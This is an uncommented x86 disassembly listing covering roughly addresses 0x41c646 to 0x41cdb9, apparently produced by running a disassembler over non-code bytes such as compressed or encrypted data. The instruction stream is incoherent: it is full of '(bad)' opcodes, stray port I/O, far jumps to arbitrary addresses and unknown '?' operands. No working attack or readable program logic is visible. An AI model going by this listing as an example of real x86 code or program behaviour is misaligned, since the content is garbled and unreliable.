  41c646:	mov    ds:0x99873ca8,al
  41c64b:	in     al,0xea
  41c64d:	xchg   DWORD PTR ss:[edi],ebx
  41c650:	addr16 adc edx,esp
  41c653:	aaa    
  41c654:	int    0xf5
  41c656:	sbb    ch,al
  41c658:	sub    eax,0x6e8bbc52
  41c65d:	jle    0x41c629
  41c65f:	mov    al,0x4d
  41c661:	stc    
  41c662:	shl    DWORD PTR ds:0xe9b6bb7b,1
  41c668:	mov    bh,0x40
  41c66a:	rcr    DWORD PTR [ecx+0x5c7b9c34],cl
  41c670:	and    ch,BYTE PTR [edx]
  41c672:	popf   
  41c673:	scas   eax,DWORD PTR es:[edi]
  41c674:	adc    eax,0x28bb5671
  41c679:	(bad)  
  41c67a:	lahf   
  41c67b:	and    al,0x3c
  41c67d:	mov    dh,0x24
  41c67f:	in     eax,dx
  41c680:	adc    esp,DWORD PTR [eax]
  41c682:	mov    al,ds:0x8ed2f7f2
  41c687:	shl    BYTE PTR [edi+0x1b],cl
  41c68a:	cwde   
  41c68b:	and    eax,0x4c38d091
  41c690:	cmp    al,0xa8
  41c692:	jmp    DWORD PTR [ebp+0x5b81f6d6]
  41c698:	outs   dx,BYTE PTR ds:[esi]
  41c699:	add    cl,0x60
  41c69c:	sub    DWORD PTR [ecx],edi
  41c69e:	mov    ah,0x16
  41c6a0:	outs   dx,BYTE PTR ds:[esi]
  41c6a1:	dec    ebx
  41c6a2:	push   ebx
  41c6a3:	sbb    ch,bh
  41c6a5:	ret    0xfbd8
  41c6a8:	xchg   ecx,eax
  41c6a9:	jnp    0x41c682
  41c6ab:	jg     0x41c6ca
  41c6ad:	mov    esp,0x8b230127
  41c6b2:	cdq    
  41c6b3:	leave  
  41c6b4:	mov    esp,0xbcd9de63
  41c6b9:	mov    ds:0x80127d20,eax
  41c6be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6c0:	je     0x41c69c
  41c6c2:	cmp    BYTE PTR [esi-0x4a23a033],0x96
  41c6c9:	inc    edx
  41c6ca:	mov    esp,0x706d7520
  41c6cf:	mov    esp,0x8260d290
  41c6d4:	inc    edx
  41c6d5:	cdq    
  41c6d6:	jne    0x41c755
  41c6d8:	call   0x3b52f8ee
  41c6dd:	pop    eax
  41c6de:	add    al,0xf9
  41c6e0:	and    bh,dh
  41c6e2:	(bad)  
  41c6e3:	adc    bh,BYTE PTR [ecx-0x19772d1]
  41c6e9:	pop    edx
  41c6ea:	in     al,0xc0
  41c6ec:	and    al,0xa5
  41c6ee:	xor    esi,DWORD PTR [ecx]
  41c6f0:	adc    DWORD PTR [edi-0x56ba9e75],ebx
  41c6f6:	es pop eax
  41c6f8:	push   0xa61bd92a
  41c6fd:	das    
  41c6fe:	mov    eax,0x2e38caad
  41c703:	lea    eax,[edx-0x149287ba]
  41c709:	xchg   edi,eax
  41c70a:	sub    BYTE PTR [esi-0x10],cl
  41c70d:	test   al,0x76
  41c70f:	jmp    0xe14a4385
  41c714:	or     DWORD PTR [edi-0x1f65dde4],0x27991c11
  41c71e:	inc    DWORD PTR [ecx+0x60608b21]
  41c724:	sbb    bh,BYTE PTR [edx+ecx*2+0x23]
  41c728:	cli    
  41c729:	(bad)  
  41c72a:	pop    ecx
  41c72b:	push   edx
  41c72c:	xchg   BYTE PTR [ebx],cl
  41c72e:	mov    ecx,0x4cf4c500
  41c733:	push   edi
  41c734:	ds jp  0x41c794
  41c737:	dec    eax
  41c738:	sbb    edi,DWORD PTR [esi-0x5751dff9]
  41c73e:	out    dx,eax
  41c73f:	test   BYTE PTR [ecx+0x1],bh
  41c742:	pop    edx
  41c743:	pop    ebx
  41c744:	aas    
  41c745:	cli    
  41c746:	mov    eax,ds:0xcb146754
  41c74b:	je     0x41c762
  41c74d:	push   ebp
  41c74e:	mov    dh,0xb2
  41c750:	ja     0x41c70f
  41c752:	xor    DWORD PTR [edi+0x6692bff4],ebp
  41c758:	pop    ss
  41c759:	jmp    0x78:0x4b887df4
  41c760:	jecxz  0x41c741
  41c762:	aam    0x58
  41c764:	inc    ecx
  41c765:	imul   esi,DWORD PTR [edx],0xffffff9b
  41c768:	adc    cl,BYTE PTR [eax-0x66d71d9d]
  41c76e:	cdq    
  41c76f:	adc    al,0xfa
  41c771:	jge    0x41c743
  41c773:	and    BYTE PTR [esi+eiz*8],bl
  41c776:	lods   al,BYTE PTR ds:[esi]
  41c777:	fyl2x  
  41c779:	clc    
  41c77a:	add    BYTE PTR [ecx+0x3dbd9a7f],dh
  41c780:	out    0x50,eax
  41c782:	dec    ebx
  41c783:	jecxz  0x41c757
  41c785:	popa   
  41c786:	push   es
  41c787:	jp     0x41c7f8
  41c789:	mov    bl,0x1a
  41c78b:	ss call 0xc8f0:0x66ee11f1
  41c793:	cmp    edi,DWORD PTR [ecx]
  41c795:	mov    esi,0x6a6a0076
  41c79a:	xchg   esi,eax
  41c79b:	icebp  
  41c79c:	sbb    al,BYTE PTR [edi]
  41c79e:	xchg   edi,eax
  41c79f:	lods   al,BYTE PTR ds:[esi]
  41c7a0:	dec    edi
  41c7a1:	call   0xd77d99bb
  41c7a6:	rcl    eax,0x2c
  41c7a9:	ins    DWORD PTR es:[edi],dx
  41c7aa:	cmp    bh,BYTE PTR [ecx+0x6286c23b]
  41c7b0:	adc    esi,DWORD PTR [eax-0x7e]
  41c7b3:	inc    esi
  41c7b4:	jmp    0x68ed:0x7aec12ce
  41c7bb:	jbe    0x41c772
  41c7bd:	rcr    edi,1
  41c7bf:	es push esi
  41c7c1:	pop    ebx
  41c7c2:	sub    al,dl
  41c7c4:	xchg   esi,eax
  41c7c5:	pusha  
  41c7c6:	add    eax,0x3fb728f6
  41c7cb:	sbb    DWORD PTR [ebp+0x12],esp
  41c7ce:	dec    eax
  41c7cf:	in     al,0x3b
  41c7d1:	xor    al,0x93
  41c7d3:	das    
  41c7d4:	stos   DWORD PTR es:[edi],eax
  41c7d5:	mov    esp,0xda29adc1
  41c7da:	or     DWORD PTR [ecx],edx
  41c7dc:	out    dx,eax
  41c7dd:	sub    eax,0x439d52ba
  41c7e2:	test   al,0x10
  41c7e4:	out    dx,al
  41c7e5:	pop    es
  41c7e6:	xchg   ecx,eax
  41c7e7:	and    bl,dh
  41c7e9:	xchg   ebx,eax
  41c7ea:	imul   BYTE PTR [edx]
  41c7ec:	into   
  41c7ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7ee:	daa    
  41c7ef:	(bad)  
  41c7f0:	es loopne 0x41c82c
  41c7f3:	cmc    
  41c7f4:	int    0x48
  41c7f6:	and    BYTE PTR [eax-0x7289cf9c],ah
  41c7fc:	adc    DWORD PTR [edi+0x19],0x5ddb5b0
  41c803:	pop    ecx
  41c804:	call   0xf5b0c43f
  41c809:	mov    dl,0x33
  41c80b:	clc    
  41c80c:	std    
  41c80d:	ja     0x41c7d1
  41c80f:	pop    ss
  41c810:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c811:	pop    edi
  41c812:	mov    ds:0x8f078e6d,al
  41c817:	call   0xa9c353dc
  41c81c:	(bad)  
  41c81d:	adc    cl,BYTE PTR [edi]
  41c81f:	mov    esi,0xf479f67c
  41c824:	out    dx,al
  41c825:	call   0xd9cc7a22
  41c82a:	inc    ebp
  41c82b:	adc    ah,BYTE PTR [ebp+0x45]
  41c82e:	jae    0x41c88a
  41c830:	adc    BYTE PTR [ecx],bl
  41c832:	out    dx,eax
  41c833:	mov    esi,0x4919c0fb
  41c838:	jns    0x41c888
  41c83a:	pop    esp
  41c83b:	jmp    0xa46b:0xaddd9b50
  41c842:	stos   BYTE PTR es:[edi],al
  41c843:	int3   
  41c844:	dec    edi
  41c845:	push   0x5c75450a
  41c84a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c84b:	daa    
  41c84c:	mov    DWORD PTR [esi-0x486ca75a],esp
  41c852:	add    DWORD PTR [ebx],eax
  41c854:	cmp    esp,0x2d
  41c857:	in     al,0x5e
  41c859:	jmp    0x41c7ea
  41c85b:	test   al,0x38
  41c85d:	ja     0x41c805
  41c85f:	lods   al,BYTE PTR ds:[esi]
  41c860:	fldenv [ecx+0x63]
  41c863:	mov    ebx,0x766d7d0a
  41c868:	sub    eax,0xf039ac49
  41c86d:	push   ebx
  41c86e:	aad    0x3
  41c870:	sbb    esp,DWORD PTR [ebx+0x6b1e04b2]
  41c876:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c877:	mov    ah,0xaa
  41c879:	lods   eax,DWORD PTR ds:[si]
  41c87b:	cdq    
  41c87c:	mov    gs,ecx
  41c87e:	mov    esi,0x7e1e27c7
  41c883:	inc    DWORD PTR [esi+0x2e]
  41c886:	xor    al,0xb4
  41c888:	lods   al,BYTE PTR ds:[esi]
  41c889:	push   ecx
  41c88a:	pusha  
  41c88b:	push   ecx
  41c88c:	cld    
  41c88d:	in     al,dx
  41c88e:	adc    DWORD PTR [eax-0x7610bc6],eax
  41c894:	es lock nop
  41c897:	mov    ?,WORD PTR [eax+0x3b]
  41c89a:	nop
  41c89b:	stos   DWORD PTR es:[edi],eax
  41c89c:	fwait
  41c89d:	xchg   edi,eax
  41c89e:	cmp    al,ah
  41c8a0:	mov    esp,0x6cd71dd6
  41c8a5:	scas   al,BYTE PTR es:[edi]
  41c8a6:	mov    BYTE PTR [ecx],dl
  41c8a8:	fldenv [ecx-0x5]
  41c8ab:	mov    ss,WORD PTR [edi+0x16]
  41c8ae:	cli    
  41c8af:	lods   eax,DWORD PTR ds:[esi]
  41c8b0:	dec    eax
  41c8b1:	test   BYTE PTR [eax],ch
  41c8b3:	inc    ebp
  41c8b4:	xlat   BYTE PTR ds:[ebx]
  41c8b5:	and    al,ch
  41c8b7:	and    eax,0xb5989e0b
  41c8bc:	test   al,0x12
  41c8be:	dec    esi
  41c8bf:	sub    DWORD PTR [edi+edi*8-0x7c845e82],eax
  41c8c6:	in     eax,dx
  41c8c7:	mov    edi,ebp
  41c8c9:	in     al,dx
  41c8ca:	xor    al,0x1a
  41c8cc:	push   ebx
  41c8cd:	xor    al,0x8e
  41c8cf:	outs   dx,DWORD PTR ds:[esi]
  41c8d0:	push   esi
  41c8d1:	loop   0x41c8d8
  41c8d3:	loop   0x41c953
  41c8d5:	div    BYTE PTR [eax-0x55]
  41c8d8:	ss mov edx,0x2858e1c0
  41c8de:	mov    BYTE PTR [ebp+0x28b0487f],ch
  41c8e4:	mov    ebp,DWORD PTR cs:[edx-0x61bdc188]
  41c8eb:	ss dec ecx
  41c8ed:	mov    dh,0x5f
  41c8ef:	out    dx,al
  41c8f0:	jecxz  0x41c967
  41c8f2:	adc    DWORD PTR [ebp+0x4b],edi
  41c8f5:	sbb    edx,DWORD PTR [edx*2+0x37607032]
  41c8fc:	xchg   edx,eax
  41c8fd:	stos   DWORD PTR es:[edi],eax
  41c8fe:	loop   0x41c932
  41c900:	popf   
  41c901:	jle    0x41c922
  41c903:	xchg   esi,eax
  41c904:	test   eax,0x3527e659
  41c909:	jecxz  0x41c894
  41c90b:	rcr    BYTE PTR [ebp-0x7f],cl
  41c90e:	dec    edi
  41c90f:	sbb    ecx,esi
  41c911:	out    0x15,al
  41c913:	sub    ah,BYTE PTR [esi+esi*1-0x21]
  41c917:	imul   esp,edi,0xfffffffa
  41c91a:	mov    ecx,0xafd9cb88
  41c91f:	mov    DWORD PTR [eax],ecx
  41c921:	xor    dl,ch
  41c923:	mov    esi,0x4f64fa85
  41c928:	cmp    eax,0xeaa7c3a1
  41c92d:	pop    es
  41c92e:	std    
  41c92f:	mov    bh,0x84
  41c931:	(bad)  
  41c933:	hlt    
  41c934:	push   esi
  41c935:	pop    ecx
  41c936:	ret    
  41c937:	cwde   
  41c938:	pop    esp
  41c939:	jle    0x41c8fe
  41c93b:	mov    ah,0xf0
  41c93d:	jno    0x41c956
  41c93f:	cli    
  41c940:	(bad)  
  41c941:	fld    st(1)
  41c943:	test   DWORD PTR [edi+edi*4-0x1fb1db0e],edi
  41c94a:	test   BYTE PTR [edx],bh
  41c94c:	test   BYTE PTR [ecx],0xdb
  41c94f:	xchg   esi,eax
  41c950:	cs xchg edx,eax
  41c952:	sub    DWORD PTR [ebx],0x978e077b
  41c958:	push   eax
  41c959:	stos   BYTE PTR es:[edi],al
  41c95a:	adc    DWORD PTR [eax],ebp
  41c95c:	cmp    eax,0xa9afc606
  41c961:	ret    
  41c962:	jg     0x41c922
  41c964:	xchg   esi,eax
  41c965:	cdq    
  41c966:	les    edx,FWORD PTR [ebx]
  41c968:	or     ebx,DWORD PTR [ecx+0x2649da63]
  41c96e:	gs adc esp,ebx
  41c971:	arpl   WORD PTR [ebp+0x68f2572b],ax
  41c977:	inc    eax
  41c978:	mov    ebx,ebp
  41c97a:	mov    ch,0x70
  41c97c:	push   ebp
  41c97d:	sti    
  41c97e:	xchg   edi,eax
  41c97f:	or     cl,BYTE PTR ds:0x8c95174e
  41c985:	xchg   ax,ax
  41c987:	es push esi
  41c989:	pop    ss
  41c98a:	dec    esi
  41c98b:	push   ss
  41c98c:	and    edx,edx
  41c98e:	pop    ds
  41c98f:	pop    ds
  41c990:	sahf   
  41c991:	xor    DWORD PTR [ebp-0x2affd0f3],edi
  41c997:	xchg   DWORD PTR [eax-0x5f0b8545],esp
  41c99d:	test   eax,0x2e242120
  41c9a2:	and    edx,DWORD PTR [esi+edi*8]
  41c9a5:	iret   
  41c9a6:	xor    eax,0x313dd531
  41c9ab:	jbe    0x41c9fd
  41c9ad:	mov    eax,?
  41c9af:	loope  0x41c9be
  41c9b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9b2:	std    
  41c9b3:	cs mov bh,0x9c
  41c9b6:	mov    WORD PTR [edx-0x2c],gs
  41c9b9:	jle    0x41ca0d
  41c9bb:	ins    BYTE PTR es:[edi],dx
  41c9bc:	xchg   esp,eax
  41c9bd:	cs int 0x9f
  41c9c0:	jns    0x41c9df
  41c9c2:	addr16 int3 
  41c9c4:	pop    ebp
  41c9c5:	push   eax
  41c9c6:	mov    ds:0xdb5f31cd,al
  41c9cb:	xchg   ecx,eax
  41c9cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9cd:	ror    DWORD PTR [edx+0x1e],0x18
  41c9d1:	cdq    
  41c9d2:	icebp  
  41c9d3:	or     al,0x4b
  41c9d5:	or     ah,ch
  41c9d7:	(bad)  
  41c9d8:	in     al,dx
  41c9d9:	scas   al,BYTE PTR es:[edi]
  41c9da:	sub    al,0xf0
  41c9dc:	add    al,0x75
  41c9de:	xchg   edx,eax
  41c9df:	mov    ebp,0x179890a8
  41c9e4:	cs scas al,BYTE PTR es:[edi]
  41c9e6:	mov    edx,0x82ba93ad
  41c9eb:	jge    0x41c977
  41c9ed:	(bad)  
  41c9ee:	cld    
  41c9ef:	outs   dx,DWORD PTR ds:[esi]
  41c9f0:	cs scas eax,DWORD PTR es:[edi]
  41c9f2:	shl    DWORD PTR [edx-0x73],1
  41c9f5:	push   ecx
  41c9f6:	push   ecx
  41c9f7:	enter  0x3119,0xfa
  41c9fb:	mov    bh,0x92
  41c9fd:	or     eax,0x4a60a3a1
  41ca02:	jo     0x41c9eb
  41ca04:	dec    ebx
  41ca05:	jne    0x41c9f3
  41ca07:	imul   edi,DWORD PTR [edx+0x0],0xebfe457c
  41ca0e:	jl     0x41ca2a
  41ca10:	xchg   DWORD PTR [ebx+eiz*4+0x1f82f0e4],edx
  41ca17:	cmp    edi,ebx
  41ca19:	imul   ecx,ecx,0x3d
  41ca1c:	out    0xa5,eax
  41ca1e:	mov    esp,edi
  41ca20:	pop    edi
  41ca21:	out    dx,eax
  41ca22:	ins    BYTE PTR es:[edi],dx
  41ca23:	rcr    DWORD PTR [ecx],0x39
  41ca26:	and    eax,0xf0984c64
  41ca2b:	sahf   
  41ca2c:	imul   edi,DWORD PTR [ebp+0x28858f26],0x49
  41ca33:	std    
  41ca34:	dec    ebp
  41ca35:	dec    esp
  41ca36:	sbb    al,0x6d
  41ca38:	jne    0x41c9c9
  41ca3a:	popf   
  41ca3b:	xchg   BYTE PTR [edi],al
  41ca3d:	add    al,0xf1
  41ca3f:	or     eax,0xdcbc003a
  41ca44:	repz not cl
  41ca47:	lds    ecx,FWORD PTR [edi]
  41ca49:	xchg   DWORD PTR [ebp+0x20],ebx
  41ca4c:	(bad)  
  41ca4d:	cdq    
  41ca4e:	sub    eax,0x9cd711cc
  41ca53:	xor    BYTE PTR [ecx+0x4c13d753],cl
  41ca59:	fwait
  41ca5a:	mov    BYTE PTR fs:[esi+0x45],al
  41ca5e:	push   ecx
  41ca5f:	mov    eax,0x96ef0d95
  41ca64:	outs   dx,BYTE PTR ds:[esi]
  41ca65:	xor    BYTE PTR [edx],dh
  41ca67:	jbe    0x41ca8b
  41ca69:	test   al,0xbe
  41ca6b:	pop    ecx
  41ca6c:	sbb    bh,BYTE PTR [eax-0x40c30a1]
  41ca72:	jecxz  0x41ca7e
  41ca74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca75:	inc    edi
  41ca76:	add    DWORD PTR [edi],0xfbf9c11c
  41ca7c:	add    BYTE PTR [si+0x32ae],ah
  41ca81:	scas   al,BYTE PTR es:[edi]
  41ca82:	xor    al,0x5c
  41ca84:	test   esp,esi
  41ca86:	or     ebp,edx
  41ca88:	mov    eax,es:0xdcd81fc5
  41ca8e:	aas    
  41ca8f:	mov    esp,0x6d130796
  41ca94:	in     al,dx
  41ca95:	dec    ebp
  41ca96:	adc    eax,0x9b996cbb
  41ca9b:	call   0x8518:0x199175b5
  41caa2:	inc    DWORD PTR [edx]
  41caa4:	cs enter 0x4e7a,0x3f
  41caa9:	mov    eax,ds:0x9cc96af9
  41caae:	pop    eax
  41caaf:	in     eax,dx
  41cab0:	mov    eax,ds:0x755544cd
  41cab5:	scas   eax,DWORD PTR es:[edi]
  41cab6:	in     eax,dx
  41cab7:	lds    ebx,FWORD PTR ds:0xd88b850d
  41cabd:	pop    edx
  41cabe:	(bad)  [eax]
  41cac0:	jae    0x41caf0
  41cac2:	mov    DWORD PTR [esp+edi*4+0x59f1dc2c],ecx
  41cac9:	outs   dx,BYTE PTR ds:[esi]
  41caca:	shr    BYTE PTR [ebp+0x6f],1
  41cacd:	ja     0x41cb43
  41cacf:	or     DWORD PTR [ebx-0x5fee352c],edx
  41cad5:	and    DWORD PTR [edx],esi
  41cad7:	xchg   edi,eax
  41cad8:	sbb    al,0x1b
  41cada:	fstp   TBYTE PTR ds:0xfaff3f59
  41cae0:	dec    edx
  41cae1:	push   edx
  41cae2:	(bad)  
  41cae3:	xchg   ebx,eax
  41cae4:	lods   eax,DWORD PTR ds:[esi]
  41cae5:	fs or  al,0x71
  41cae8:	ret    0xcde4
  41caeb:	dec    edx
  41caec:	sar    dl,1
  41caee:	div    BYTE PTR ds:0xfc8cbb9c
  41caf4:	in     al,0x5c
  41caf6:	cwde   
  41caf7:	std    
  41caf8:	mov    ds:0x860b0969,eax
  41cafd:	retf   0xf54d
  41cb00:	mov    DWORD PTR [edi-0x6c],ecx
  41cb03:	ja     0x41caf4
  41cb05:	add    cl,BYTE PTR [esi+edx*8+0x5f650eed]
  41cb0c:	and    dh,BYTE PTR [esi-0x74afdbe5]
  41cb12:	lds    edi,FWORD PTR [eax]
  41cb14:	xor    eax,0xb922ecea
  41cb19:	pushf  
  41cb1a:	jns    0x41cb29
  41cb1c:	pusha  
  41cb1d:	ds jo  0x41cac4
  41cb20:	shl    BYTE PTR [eax+0x79171ab1],0x95
  41cb27:	cmp    ecx,DWORD PTR [eax-0x71]
  41cb2a:	in     al,0x16
  41cb2c:	int3   
  41cb2d:	mov    ebp,0x6915fab1
  41cb32:	inc    esp
  41cb33:	mov    al,ds:0xe988630a
  41cb38:	mov    ebx,0x54b79b63
  41cb3d:	lea    eax,[ebx+0x47]
  41cb40:	push   es
  41cb41:	and    BYTE PTR [edx+0x1d],dl
  41cb44:	loope  0x41cafc
  41cb46:	mov    ds:0x17c2877f,al
  41cb4b:	or     esp,DWORD PTR [esi+0xa]
  41cb4e:	stos   BYTE PTR es:[edi],al
  41cb4f:	dec    edi
  41cb50:	or     al,0x27
  41cb52:	mov    ecx,0x27752824
  41cb57:	mov    ebp,0xc6d2e3f
  41cb5c:	sbb    DWORD PTR [edi+0x92fe85f],ebp
  41cb62:	popa   
  41cb63:	mov    dl,0x86
  41cb65:	enter  0x4c96,0x3b
  41cb69:	cld    
  41cb6a:	mov    al,0x89
  41cb6c:	out    0x93,eax
  41cb6e:	dec    ecx
  41cb6f:	mov    bh,0x1b
  41cb71:	or     dl,dh
  41cb73:	out    dx,al
  41cb74:	sti    
  41cb75:	mov    edi,0x99010358
  41cb7a:	adc    esp,DWORD PTR [bp+si+0x5]
  41cb7e:	adc    esp,DWORD PTR [edx+0x6ef72c0a]
  41cb84:	cmc    
  41cb85:	inc    eax
  41cb86:	add    DWORD PTR [ecx+edx*2-0x77],edi
  41cb8a:	mov    eax,0xa444447f
  41cb8f:	cld    
  41cb90:	ja     0x41cb70
  41cb92:	jg     0x41cc03
  41cb94:	gs daa 
  41cb96:	or     al,0xd2
  41cb98:	mov    dl,0xa4
  41cb9a:	sbb    al,0x52
  41cb9c:	jmp    0x986a:0xda8cb055
  41cba3:	jb     0x41cb34
  41cba5:	or     DWORD PTR ds:0x81ce5ee3,esp
  41cbab:	scas   eax,DWORD PTR es:[edi]
  41cbac:	pop    DWORD PTR [ebx+0x12471525]
  41cbb2:	scas   al,BYTE PTR es:[edi]
  41cbb3:	lods   eax,DWORD PTR ds:[esi]
  41cbb4:	in     al,dx
  41cbb5:	cmp    eax,0x388fed80
  41cbba:	mov    esp,DWORD PTR [edx-0x31461e67]
  41cbc0:	loopne 0x41cc3d
  41cbc2:	dec    edx
  41cbc3:	mov    eax,0x85896cb1
  41cbc8:	int3   
  41cbc9:	imul   ecx,DWORD PTR [edx-0x69f6b738],0xd80595a6
  41cbd3:	mov    ch,0xd3
  41cbd5:	in     eax,dx
  41cbd6:	jno    0x41cc42
  41cbd8:	arpl   WORD PTR [edx+edi*2],cx
  41cbdb:	or     bl,BYTE PTR [edx-0x55]
  41cbde:	and    al,0xc6
  41cbe0:	prefetchnta BYTE PTR [eax+0x364d168a]
  41cbe7:	jge    0x41cb77
  41cbe9:	jae    0x41cbe9
  41cbeb:	jmp    0xc891:0x86a70f7
  41cbf2:	xchg   edx,eax
  41cbf3:	cli    
  41cbf4:	xchg   ebx,eax
  41cbf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbf6:	mov    esi,0xe67f8a97
  41cbfb:	mov    dh,0x39
  41cbfd:	jmp    0x41cbf8
  41cbff:	stc    
  41cc00:	mov    edx,0xdc405456
  41cc05:	sub    ebx,esi
  41cc07:	in     eax,dx
  41cc08:	push   edx
  41cc09:	in     eax,0xb2
  41cc0b:	jmp    0x204b2261
  41cc10:	mov    DWORD PTR [esp+esi*4+0x1cf948ff],ecx
  41cc17:	mov    esi,0x9e13b642
  41cc1c:	es sub al,0x1a
  41cc1f:	lock lods al,BYTE PTR ds:[esi]
  41cc21:	push   ecx
  41cc22:	jo     0x41cbc9
  41cc24:	mov    bl,0x10
  41cc26:	loop   0x41cca5
  41cc28:	push   edi
  41cc29:	adc    al,0x5e
  41cc2b:	jmp    0x7cb7:0x2c8f55b0
  41cc32:	mov    cl,0xe7
  41cc34:	jmp    0xdfa7:0x2a4ff27
  41cc3b:	mov    eax,ds:0xe4bfa63e
  41cc40:	jo     0x41ccb1
  41cc42:	std    
  41cc43:	push   ebp
  41cc44:	inc    esi
  41cc45:	outs   dx,DWORD PTR ds:[esi]
  41cc46:	cmp    BYTE PTR [edx+eiz*1-0x7b501792],bh
  41cc4d:	sub    dl,BYTE PTR [edx+0x47f0cd75]
  41cc53:	aaa    
  41cc54:	fidivr DWORD PTR [eax-0x62]
  41cc57:	xor    bl,BYTE PTR fs:[ebx]
  41cc5a:	or     al,0x96
  41cc5c:	ds xchg ch,cl
  41cc5f:	test   BYTE PTR [edx-0x162eb17c],bl
  41cc65:	ds jmp 0x41cc50
  41cc68:	in     eax,0x10
  41cc6a:	das    
  41cc6b:	int3   
  41cc6c:	pop    edi
  41cc6d:	jge    0x41cc47
  41cc6f:	and    BYTE PTR [esp+ecx*1+0xdbae836],cl
  41cc76:	cs loopne 0x41cc16
  41cc79:	sti    
  41cc7a:	cmp    BYTE PTR [edi+esi*4-0x3f],bh
  41cc7e:	pop    ecx
  41cc7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc80:	inc    esi
  41cc81:	(bad)  
  41cc82:	pop    edx
  41cc83:	icebp  
  41cc84:	iret   
  41cc85:	call   0xbcd63f0e
  41cc8a:	sub    ebp,DWORD PTR [ebx-0x21aedb5c]
  41cc90:	add    edx,DWORD PTR [esi]
  41cc92:	(bad)  
  41cc94:	jbe    0x41cc79
  41cc96:	js     0x41ccdf
  41cc98:	(bad)  
  41cc9a:	(bad)  
  41cc9b:	sbb    edx,esp
  41cc9d:	add    BYTE PTR [eax+eax*4],bh
  41cca0:	jp     0x41cc60
  41cca2:	adc    BYTE PTR [edx-0x68],al
  41cca5:	cli    
  41cca6:	pop    esi
  41cca7:	cmp    BYTE PTR [edx+eax*1+0x6326cf81],ah
  41ccae:	mov    ah,0x11
  41ccb0:	in     eax,0xa0
  41ccb2:	sbb    ebp,DWORD PTR [ecx+0x5d]
  41ccb5:	nop
  41ccb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccb7:	add    eax,ebx
  41ccb9:	pushf  
  41ccba:	fnstenv [edi+0x25a18bec]
  41ccc0:	fisttp WORD PTR [ebx+0x21]
  41ccc3:	dec    ebx
  41ccc4:	jno    0x41cd01
  41ccc6:	scas   eax,DWORD PTR es:[edi]
  41ccc7:	push   esp
  41ccc8:	sub    eax,0x26bac39e
  41cccd:	scas   al,BYTE PTR es:[edi]
  41ccce:	jle    0x41cd11
  41ccd0:	scas   al,BYTE PTR es:[edi]
  41ccd1:	fild   DWORD PTR [ebp-0x11d1728e]
  41ccd7:	inc    ecx
  41ccd8:	cmp    BYTE PTR [esi+0x67],al
  41ccdb:	fsubr  DWORD PTR [edi+0x5c]
  41ccde:	(bad)  
  41ccdf:	xchg   edi,eax
  41cce0:	hlt    
  41cce1:	hlt    
  41cce2:	test   BYTE PTR [edx+0x33],dh
  41cce5:	rcr    DWORD PTR [edi-0x13],1
  41cce8:	push   edx
  41cce9:	data16 mov bh,0xd3
  41ccec:	neg    bh
  41ccee:	in     eax,0xea
  41ccf0:	add    al,0x29
  41ccf2:	inc    esp
  41ccf3:	sub    eax,0x44305a1d
  41ccf8:	shl    bl,cl
  41ccfa:	(bad)  
  41ccfb:	stos   BYTE PTR es:[edi],al
  41ccfc:	adc    BYTE PTR [ecx+0x6b],0xc6
  41cd00:	stos   DWORD PTR es:[edi],eax
  41cd01:	adc    ecx,edi
  41cd03:	sub    ch,BYTE PTR [esi]
  41cd05:	fimul  DWORD PTR [eax+edi*8]
  41cd08:	mov    al,ds:0x90b3c745
  41cd0d:	rol    BYTE PTR [eax-0x7c],cl
  41cd10:	jmp    0x3b8a34a3
  41cd15:	sub    ebx,ecx
  41cd17:	dec    ebp
  41cd18:	cmp    al,0x56
  41cd1a:	mov    al,0xac
  41cd1c:	xchg   edi,eax
  41cd1d:	mov    ebx,0xcd5e5837
  41cd22:	test   eax,0x236f75ef
  41cd28:	popf   
  41cd29:	mov    cl,0x1f
  41cd2b:	cmp    BYTE PTR [eax+0x3d],bl
  41cd2e:	sbb    dh,BYTE PTR [eax]
  41cd30:	mov    WORD PTR [esi],?
  41cd32:	add    al,0x10
  41cd34:	cmp    eax,0xc5b5c57d
  41cd39:	addr16 out dx,eax
  41cd3b:	in     al,dx
  41cd3c:	popa   
  41cd3d:	outs   dx,DWORD PTR ds:[esi]
  41cd3e:	pop    eax
  41cd3f:	(bad)  
  41cd40:	pop    ecx
  41cd41:	sahf   
  41cd42:	cwde   
  41cd43:	jmp    0xef485645
  41cd48:	adc    al,0x11
  41cd4a:	gs aas 
  41cd4c:	push   esi
  41cd4d:	leave  
  41cd4e:	lods   eax,DWORD PTR ds:[esi]
  41cd4f:	add    DWORD PTR [ecx+0x54],edx
  41cd52:	add    bh,dl
  41cd54:	ss clc 
  41cd56:	xor    eax,0x28bdc1d8
  41cd5b:	fnstenv [ebp-0x5a7cbc67]
  41cd61:	cmp    eax,0xcb0be6f5
  41cd66:	dec    eax
  41cd67:	xchg   esp,eax
  41cd68:	dec    ebp
  41cd69:	je     0x41cd97
  41cd6b:	es mov ecx,0x60565492
  41cd71:	push   0x7dc15630
  41cd76:	fadd   QWORD PTR [esi]
  41cd78:	es mov edx,0x584adb25
  41cd7e:	hlt    
  41cd7f:	fadd   QWORD PTR [esi]
  41cd81:	imul   esi,esi,0x369aefae
  41cd87:	ficomp WORD PTR [edx-0x6d]
  41cd8a:	push   ds
  41cd8b:	pop    edi
  41cd8c:	shr    DWORD PTR [edx-0x7e7806de],1
  41cd92:	clc    
  41cd93:	hlt    
  41cd94:	xor    DWORD PTR [edi+edx*2-0x4a9aab3b],edx
  41cd9b:	outs   dx,BYTE PTR ds:[esi]
  41cd9c:	push   edx
  41cd9d:	adc    ah,ah
  41cd9f:	pop    ds
  41cda0:	adc    DWORD PTR [ebp+0x14478c0e],edi
  41cda6:	xor    eax,0xc42de543
  41cdab:	cmp    BYTE PTR [ecx+0x4a6b8427],dh
  41cdb1:	mov    al,ds:0x13fe753f
  41cdb6:	int    0xae
  41cdb8:	pop    ebp
  41cdb9:	jl     0x41ce12
